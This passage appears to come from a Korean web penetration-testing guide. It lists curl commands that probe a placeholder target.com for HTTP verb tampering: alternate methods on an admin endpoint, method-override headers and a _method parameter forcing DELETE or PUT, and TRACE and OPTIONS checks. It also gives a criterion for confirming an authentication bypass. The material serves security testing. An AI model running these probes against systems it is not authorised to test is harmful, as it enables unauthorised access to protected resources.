### Phase 2: 동적 테스트 (검증)


**테스트 방법:**

1. **인증이 필요한 엔드포인트에 다른 메서드로 요청:**
```
# 원래 POST만 허용되는 엔드포인트에 다른 메서드로 시도
curl -X GET "https://target.com/admin/users" -v
curl -X PUT "https://target.com/admin/users" -v
curl -X HEAD "https://target.com/admin/users" -v
curl -X OPTIONS "https://target.com/admin/users" -v
curl -X PATCH "https://target.com/admin/users" -v
```

2. **Method Override 테스트:**
```
# X-HTTP-Method-Override 헤더
curl -X POST "https://target.com/api/resource" \
  -H "X-HTTP-Method-Override: DELETE" -v

# _method 파라미터
curl -X POST "https://target.com/api/resource" \
  -d "_method=DELETE" -v

# X-Method-Override 헤더
curl -X POST "https://target.com/api/resource" \
  -H "X-Method-Override: PUT" -v
```

3. **TRACE 메서드 테스트:**
```
curl -X TRACE "https://target.com/" -v
```

4. **OPTIONS로 허용 메서드 확인:**
```
curl -X OPTIONS "https://target.com/api/resource" -v
# Allow 헤더에서 허용된 메서드 목록 확인
```

**검증 기준:**
- **확인됨**: 동적 테스트로 메서드 변경으로 인증/인가가 우회되어 보호된 리소스에 접근한 것을 직접 확인함
